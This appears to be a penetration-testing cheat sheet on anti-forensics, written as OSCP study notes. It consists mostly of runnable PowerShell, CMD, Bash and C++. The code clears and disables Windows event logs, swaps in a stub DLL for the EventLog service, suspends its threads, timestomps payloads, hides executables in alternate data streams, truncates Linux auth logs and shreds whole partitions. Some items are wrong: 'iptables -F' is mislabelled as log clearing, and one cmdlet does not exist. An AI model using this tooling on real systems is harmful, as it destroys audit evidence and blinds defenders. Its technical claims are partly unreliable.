# Anti-Forensics & Covering Tracks

Complete guide for minimizing forensic artifacts and covering tracks during penetration testing.

---

## Table of Contents
1. [Event Log Management](#1-event-log-management)
2. [File & Timestamp Manipulation](#2-file--timestamp-manipulation)
3. [Process & Memory Cleanup](#3-process--memory-cleanup)
4. [Network Artifact Removal](#4-network-artifact-removal)
5. [Registry Cleanup](#5-registry-cleanup)
6. [Secure Deletion](#6-secure-deletion)
7. [OSCP Best Practices](#7-oscp-best-practices)

---

## 1. Event Log Management

### 1.1 Clear Event Logs

**PowerShell (Requires Admin):**
```powershell
# Clear all logs
Get-EventLog -LogName * | ForEach-Object { Clear-EventLog $_.Log }

# Clear specific logs
Clear-EventLog -LogName Application
Clear-EventLog -LogName System
Clear-EventLog -LogName Security

# Alternative (wevtutil)
wevtutil cl Application
wevtutil cl System
wevtutil cl Security
wevtutil cl "Windows PowerShell"
```

**CMD:**
```cmd
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
```

**Note:** Clearing logs is highly suspicious and logged in Event ID 1102

---

### 1.2 Disable Event Logging

**Stop EventLog Service:**
```powershell
# Stop service (requires SYSTEM)
Stop-Service EventLog

# Disable service
Set-Service EventLog -StartupType Disabled
```

**Via Registry:**
```powershell
# Disable Security log
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\EventLog\Security" -Name "Start" -Value 4
```

---

### 1.3 Selective Event Deletion

**PowerShell:**
```powershell
# Delete events from specific source
Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4624} | ForEach-Object {
    Remove-WinEvent -Id $_.RecordId -LogName Security
}

# Delete events in time range
$startTime = Get-Date "2024-01-05 10:00:00"
$endTime = Get-Date "2024-01-05 11:00:00"
Get-WinEvent -LogName Security | Where-Object {
    $_.TimeCreated -ge $startTime -and $_.TimeCreated -le $endTime
} | Remove-WinEvent
```

**Note:** `Remove-WinEvent` is not a built-in cmdlet, requires custom implementation

---

### 1.4 Phantom DLL (Disable Event Logging via DLL Hijacking)

**Theory:**
- Replace wevtsvc.dll with malicious version
- EventLog service loads it → logging disabled

**Implementation:**
```cpp
// phantom.dll - exports required functions but does nothing
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    return TRUE;
}

// Export stubs for expected functions
extern "C" __declspec(dllexport) void EvtOpenSession() {}
extern "C" __declspec(dllexport) void EvtQuery() {}
// ... (all EventLog API functions)
```

**Deploy:**
```cmd
takeown /f C:\Windows\System32\wevtsvc.dll
icacls C:\Windows\System32\wevtsvc.dll /grant administrators:F
copy C:\Windows\System32\wevtsvc.dll C:\Windows\System32\wevtsvc.dll.bak
copy phantom.dll C:\Windows\System32\wevtsvc.dll
sc stop EventLog
sc start EventLog
```

---

### 1.5 Suspend EventLog Threads

**C++ Implementation:**
```cpp
#include <windows.h>
#include <tlhelp32.h>

void SuspendEventLogThreads() {
    DWORD eventlogPID = 0;

    // Find EventLog service PID
    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    SC_HANDLE svc = OpenService(scm, "EventLog", SERVICE_QUERY_STATUS);
    SERVICE_STATUS_PROCESS ssp;
    DWORD bytesNeeded;
    QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &bytesNeeded);
    eventlogPID = ssp.dwProcessId;

    // Enumerate and suspend threads
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te32 = {sizeof(THREADENTRY32)};

    if (Thread32First(hSnap, &te32)) {
        do {
            if (te32.th32OwnerProcessID == eventlogPID) {
                HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te32.th32ThreadID);
                SuspendThread(hThread);
                CloseHandle(hThread);
            }
        } while (Thread32Next(hSnap, &te32));
    }

    CloseHandle(hSnap);
}
```

**OSCP Limitation:** Requires SYSTEM privileges

---

## 2. File & Timestamp Manipulation

### 2.1 Timestomping (Modify MACE Times)

**MACE:**
- **M**: Modified time
- **A**: Accessed time
- **C**: Created time
- **E**: Entry modified time (MFT)

**PowerShell:**
```powershell
# Match timestamps to another file
$source = Get-Item "C:\Windows\System32\calc.exe"
$target = Get-Item "C:\payload.exe"

$target.CreationTime = $source.CreationTime
$target.LastWriteTime = $source.LastWriteTime
$target.LastAccessTime = $source.LastAccessTime
```

**C++:**
```cpp
#include <windows.h>

void Timestomp(const char* filename) {
    HANDLE hFile = CreateFile(filename, FILE_WRITE_ATTRIBUTES, 0, NULL, OPEN_EXISTING, 0, NULL);

    // Set to arbitrary date (e.g., 2020-01-01)
    SYSTEMTIME st = {2020, 1, 0, 1, 0, 0, 0, 0};
    FILETIME ft;
    SystemTimeToFileTime(&st, &ft);

    SetFileTime(hFile, &ft, &ft, &ft);
    CloseHandle(hFile);
}
```

**Linux (touch):**
```bash
# Set modified time
touch -t 202001010000 file.txt

# Match another file
touch -r /bin/bash payload.elf
```

---

### 2.2 Alternate Data Streams (ADS)

**Hide Data:**
```cmd
# Create ADS
echo "malicious payload" > benign.txt:hidden.txt

# View
dir /r

# Execute from ADS
wmic process call create "C:\benign.txt:hidden.exe"
start \\127.0.0.1\c$\benign.txt:hidden.exe
```

**PowerShell:**
```powershell
# Create ADS
Set-Content -Path "benign.txt" -Stream "hidden" -Value "secret data"

# Read ADS
Get-Content -Path "benign.txt" -Stream "hidden"

# List ADS
Get-Item "benign.txt" -Stream *
```

**Remove ADS:**
```powershell
Remove-Item -Path "benign.txt" -Stream "hidden"
```

---

### 2.3 Hidden Files & Directories

**Windows:**
```cmd
# Set hidden attribute
attrib +h +s payload.exe

# Create hidden directory
mkdir .hidden
attrib +h +s .hidden
```

**PowerShell:**
```powershell
$file = Get-Item "payload.exe"
$file.Attributes = 'Hidden,System'
```

**Linux:**
```bash
# Hidden file (starts with .)
mv payload.elf .payload

# Change permissions
chmod 000 .payload
```

---

## 3. Process & Memory Cleanup

### 3.1 Terminate Processes

**PowerShell:**
```powershell
# Kill by name
Stop-Process -Name "payload" -Force

# Kill by PID
Stop-Process -Id 1234 -Force

# Kill all matching
Get-Process | Where-Object {$_.Name -like "*malware*"} | Stop-Process -Force
```

**CMD:**
```cmd
taskkill /f /im payload.exe
taskkill /f /pid 1234
```

---

### 3.2 Clear Memory Artifacts

**Flush Working Set:**
```powershell
# Force garbage collection (PowerShell scripts)
[System.GC]::Collect()
[System.GC]::WaitForPendingFinalizers()
```

**Overwrite Memory:**
```cpp
// Before process exit
memset(shellcode, 0, sizeof(shellcode));
VirtualFree(allocatedMemory, 0, MEM_RELEASE);
```

---

### 3.3 Unload Injected DLLs

**PowerShell:**
```powershell
# Eject DLL from process
$proc = Get-Process -Id 1234
$module = $proc.Modules | Where-Object {$_.FileName -eq "C:\evil.dll"}
# ... (use FreeLibrary via P/Invoke)
```

---

## 4. Network Artifact Removal

### 4.1 Clear DNS Cache

**Windows:**
```cmd
ipconfig /flushdns
```

**PowerShell:**
```powershell
Clear-DnsClientCache
```

**Linux:**
```bash
sudo systemd-resolve --flush-caches

# Or (older systems)
sudo /etc/init.d/nscd restart
```

---

### 4.2 Clear ARP Cache

**Windows:**
```cmd
arp -d
netsh interface ip delete arpcache
```

**Linux:**
```bash
sudo ip -s -s neigh flush all
```

---

### 4.3 Clear NetBIOS Cache

**Windows:**
```cmd
nbtstat -R
nbtstat -RR
```

---

### 4.4 Firewall Log Cleanup

**Windows:**
```powershell
# Clear firewall log
Clear-Content C:\Windows\System32\LogFiles\Firewall\pfirewall.log
```

**Linux (iptables):**
```bash
# Clear iptables logs
iptables -F
iptables -X
journalctl --vacuum-time=1s
```

---

## 5. Registry Cleanup

### 5.1 Remove Run Keys

**PowerShell:**
```powershell
# Remove persistence
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Malware"
Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Malware"
```

**CMD:**
```cmd
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Malware /f
```

---

### 5.2 Clear Recent Documents

**PowerShell:**
```powershell
# Clear recent files
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force

# Clear recent locations
Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" -Recurse -Force
```

---

### 5.3 Clear MRU (Most Recently Used)

**PowerShell:**
```powershell
# Clear Run MRU
Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Recurse -Force

# Clear typed paths
Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths" -Recurse -Force
```

---

## 6. Secure Deletion

### 6.1 Overwrite & Delete Files

**PowerShell:**
```powershell
# Overwrite file with random data
$file = "C:\payload.exe"
$size = (Get-Item $file).Length
$random = New-Object byte[] $size
(New-Object Random).NextBytes($random)
[IO.File]::WriteAllBytes($file, $random)
Remove-Item $file -Force
```

**SDelete (Sysinternals):**
```cmd
# Overwrite file 7 times
sdelete -p 7 C:\payload.exe

# Wipe free space
sdelete -c C:
```

**Linux (shred):**
```bash
# Overwrite file 7 times
shred -vfz -n 7 payload.elf

# Delete partition
shred -vfz /dev/sda1
```

---

### 6.2 Clear Recycle Bin

**PowerShell:**
```powershell
Clear-RecycleBin -Force
```

**CMD:**
```cmd
rd /s /q C:\$Recycle.Bin
```

---

### 6.3 Clear Prefetch

**Windows:**
```cmd
# Delete prefetch files (execution artifacts)
del /f /s /q C:\Windows\Prefetch\*

# Or
Remove-Item C:\Windows\Prefetch\* -Force
```

---

## 7. OSCP Best Practices

### 7.1 Engagement Cleanup Checklist

**Before Exiting:**
```powershell
# 1. Remove payloads
Remove-Item C:\Windows\Temp\payload.exe -Force
Remove-Item C:\Users\Public\shell.exe -Force

# 2. Remove persistence
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater"
Get-ScheduledTask | Where-Object {$_.TaskName -like "*malicious*"} | Unregister-ScheduledTask -Confirm:$false

# 3. Clear logs (optional - be careful!)
# Clear-EventLog -LogName Security

# 4. Remove user accounts
net user backdoor /delete

# 5. Clear command history
Clear-History
Remove-Item (Get-PSReadlineOption).HistorySavePath
```

---

### 7.2 Linux Cleanup

```bash
# Remove payloads
rm -rf /tmp/payload.elf
rm -rf /var/tmp/.hidden

# Clear history
cat /dev/null > ~/.bash_history
history -c

# Remove SSH keys
rm -f ~/.ssh/authorized_keys

# Clear logs
cat /dev/null > /var/log/auth.log
cat /dev/null > /var/log/syslog
```

---

### 7.3 What NOT to Do

**Avoid:**
- ❌ Clearing ALL event logs (Event ID 1102 is obvious)
- ❌ Deleting legitimate system files
- ❌ Crashing services (DoS is bad)
- ❌ Leaving obvious backdoors

**Do:**
- ✅ Remove only YOUR artifacts
- ✅ Timestomp uploaded files
- ✅ Use ADS for persistence (harder to detect)
- ✅ Clean command history

---

## 8. Automated Cleanup Script

**PowerShell:**
```powershell
# cleanup.ps1
param(
    [switch]$RemovePayloads,
    [switch]$RemovePersistence,
    [switch]$ClearLogs
)

Write-Host "[*] Starting cleanup..."

if ($RemovePayloads) {
    Write-Host "[*] Removing payloads..."
    Remove-Item C:\Windows\Temp\*.exe -Force -ErrorAction SilentlyContinue
    Remove-Item C:\Users\Public\*.exe -Force -ErrorAction SilentlyContinue
}

if ($RemovePersistence) {
    Write-Host "[*] Removing persistence..."
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "*" -ErrorAction SilentlyContinue
    Get-ScheduledTask | Where-Object {$_.Author -ne "Microsoft"} | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
}

if ($ClearLogs) {
    Write-Host "[*] Clearing logs..."
    Get-EventLog -LogName * | ForEach-Object { Clear-EventLog $_.Log -ErrorAction SilentlyContinue }
}

Write-Host "[*] Cleanup complete!"
```

**Usage:**
```powershell
.\cleanup.ps1 -RemovePayloads -RemovePersistence
```

---

## 9. Forensic Artifacts to Remove

### 9.1 Windows Artifacts

- **Event Logs**: Security, System, Application, PowerShell
- **Prefetch**: C:\Windows\Prefetch\
- **Recent**: %APPDATA%\Microsoft\Windows\Recent\
- **Registry**: RunMRU, TypedPaths, RecentDocs
- **Browser History**: IE, Chrome, Edge
- **Jump Lists**: %APPDATA%\Microsoft\Windows\Recent\AutomaticDestinations\
- **Recycle Bin**: C:\$Recycle.Bin\
- **USN Journal**: NTFS change log

### 9.2 Linux Artifacts

- **Bash History**: ~/.bash_history, ~/.zsh_history
- **System Logs**: /var/log/auth.log, /var/log/syslog
- **Cron Jobs**: /etc/cron.d/, /var/spool/cron/
- **SSH**: ~/.ssh/authorized_keys, /var/log/secure
- **Command Logs**: /var/log/audit/audit.log

---

## 10. Detection vs. Evasion

**Blue Team Detects:**
- Event ID 1102 (Event log cleared)
- Timestomped files (suspicious dates)
- ADS usage (PowerShell transcript logs)
- Sysmon Event ID 11 (File creation with ADS)

**Red Team Evades:**
- Selective event deletion (specific IDs)
- Timestomp to recent dates (not 1970)
- Minimize disk writes (memory-only execution)
- Use native tools (living off the land)

---

## 11. References
- Red Team Notes: https://www.ired.team/
- MITRE ATT&CK: T1070 (Indicator Removal)
- Windows Forensics: https://www.sans.org/

---

**OSCP Note:** Document all actions taken during exam. Cleanup is good practice but OSCP labs are reset regularly. Focus on learning, not perfect cleanup.
